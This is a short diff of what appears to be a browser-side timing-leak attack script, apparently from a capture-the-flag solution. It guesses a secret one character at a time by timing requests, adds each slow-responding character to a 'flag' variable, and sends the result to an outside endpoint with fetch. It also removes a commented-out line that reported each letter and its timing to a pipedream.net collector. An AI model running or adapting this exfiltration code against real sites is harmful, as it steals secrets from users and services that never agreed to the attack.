@@ -42,7 +42,6 @@
                 var time = performance.now() - start;
                 console.log("The request took %d ms.", time);
                 if (time >= 2000) {
-                    //fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?lettre=${alpha[i]}&temps=${time}ms`)
                     flag = flag + alpha[i]
                     fetch(`${endpoint}${encodeURIComponent(flag)}`)
                     leak(url, 0)
